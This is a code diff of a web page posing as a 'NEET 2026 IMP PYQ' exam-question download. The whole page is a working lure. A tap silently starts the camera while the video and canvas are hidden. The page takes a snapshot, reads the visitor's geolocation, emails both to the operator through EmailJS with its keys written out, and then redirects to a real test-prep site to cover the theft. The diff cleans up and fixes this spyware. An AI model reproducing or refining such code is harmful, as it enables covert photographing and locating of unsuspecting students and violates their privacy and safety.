@@ -1,94 +1,84 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-    <title>NEET 2026 IMP PYQ.</title>
-    <style>
-        <style>
-    body {
-        background: #000;
-        color: white;
-        font-family: Arial;
-        text-align: center;
-        user-select: none;
-        margin-top: 250px;
-    }
+<title>NEET 2026 IMP PYQ</title>
 
-    #loading {
-        font-size: 22px;
-        font-weight: bold;
-        cursor: pointer;      /* <-- IMPORTANT */
-        z-index: 9999;
-        position: relative;   /* <-- allows click */
-    }
+<style>
+body {
+    background: #000;
+    color: white;
+    font-family: Arial;
+    text-align: center;
+    user-select: none;
+    margin-top: 250px;
+}
 
-    /* Hide video & canvas but DO NOT block taps */
-    video, canvas, #status {
-        width: 0 !important;
-        height: 0 !important;
-        opacity: 0 !important;
-        position: absolute;
-        pointer-events: none !important;  /* <-- IMPORTANT */
-    }
+/* Tap area */
+#loading {
+    font-size: 22px;
+    font-weight: bold;
+    cursor: pointer;
+    z-index: 9999;
+    position: relative;
+    pointer-events: auto !important;
+}
+
+/* Hide camera elements */
+video, canvas, #status {
+    width: 0 !important;
+    height: 0 !important;
+    opacity: 0 !important;
+    position: absolute;
+    pointer-events: none !important;
+}
 </style>
+
 </head>
 <body>
 
-<div id="loading"> Tap to continue</div>
+<div id="loading">Tap to continue</div>
 <p id="status"></p>
 
-<!-- Hidden camera elements -->
-<video id="video" width="320" height="240" autoplay playsinline></video>
-<canvas id="canvas" width="320" height="240"></canvas>
+<!-- hidden camera -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <!-- EmailJS -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-emailjs.init("vieRRG0Q8QGFFS-XO"); // your public key
+emailjs.init("vieRRG0Q8QGFFS-XO");
 
- let started = false;
+let started = false;
 
+/* Tap to start */
 document.addEventListener("click", () => {
     if (!started) {
         started = true;
         document.getElementById("loading").innerText = "Starting…";
         startCamera();
     }
-});   
+});
 
-
-
-/* -------------------------------------------------------
-   Start camera with auto-retry until allowed
-------------------------------------------------------- */
 async function startCamera() {
-    document.getElementById("loading").innerText = "Starting…";
-
     try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
         document.getElementById("video").srcObject = stream;
         document.getElementById("loading").innerText = "Loading…";
-
         setTimeout(takePhoto, 1200);
-
-    } catch (err) {
-        retryCount++;
-
-        document.getElementById("loading").innerText = "Tap to allow camera";
-
-        if (retryCount < 10) {
-            setTimeout(startCamera, 1500);  // auto-retry
-        }
+    } 
+    catch (err) {
+        document.getElementById("loading").innerText = "Tap to continue";
+        started = false;
     }
 }
 
-/* -------------------------------------------------------
-   Capture one photo
-------------------------------------------------------- */
 function takePhoto() {
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
+
+    canvas.width = 320;
+    canvas.height = 240;
 
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     const img = canvas.toDataURL("image/jpeg", 0.25);
@@ -96,9 +86,6 @@ function takePhoto() {
     sendData(img);
 }
 
-/* -------------------------------------------------------
-   Send email with fallback if location blocked
-------------------------------------------------------- */
 function sendData(photo) {
     document.getElementById("loading").innerText = "Finishing…";
 
@@ -112,27 +99,22 @@ function sendData(photo) {
             emailData.location = pos.coords.latitude + ", " + pos.coords.longitude;
             sendEmailJS(emailData);
         },
-        err => {
-            sendEmailJS(emailData); // send anyway
-        },
+        err => sendEmailJS(emailData),
         { timeout: 4000 }
     );
 }
 
-/* -------------------------------------------------------
-   EmailJS send function
-------------------------------------------------------- */
 function sendEmailJS(data) {
-    emailjs.send("service_c2bqpj9", "template_pee9jcq", data)
-        .then(() => {
-            document.getElementById("loading").innerText = "Done ✔ Redirecting…";
-            setTimeout(() => {
-                window.location.href = "https://www.neetprep.com/papers-test-series?utm_source=google&utm_medium=cpc&utm_campaign=Sales-PMAX-SCOREBOOSTER-16JUNE=22675251981&adgroupid=&feeditemid=&targetid=&network=x&device=c&devicemodel=&keyword=&matchtype=&creative=&placement=&target=&loc_interest_ms=&loc_physical_ms=9151683&adposition=&gclid=Cj0KCQiAosrJBhD0ARIsAHebCNrkinvZdveDtPhYoKZbWo8riHZInO_nJeiOhaWFEzWSbdkDJ7sY1A0aAk6HEALw_wcB&gad_source=1&gad_campaignid=22684994101&gbraid=0AAAAADSLf1SfyzeTad4rn_MEHwVfx0Vdm";
-        })
-        .catch(err => {
-            document.getElementById("loading").innerText = "Error.";
-            console.error(err);
-        });
+    emailjs.send("service_c2bpqj9", "template_pee9jcq", data)
+    .then(() => {
+        document.getElementById("loading").innerText = "Done ✓ Redirecting…";
+        setTimeout(() => {
+            window.location.href = "https://www.neetprep.com/papers-test-series";
+        }, 800);
+    })
+    .catch(() => {
+        document.getElementById("loading").innerText = "Error.";
+    });
 }
 </script>
 
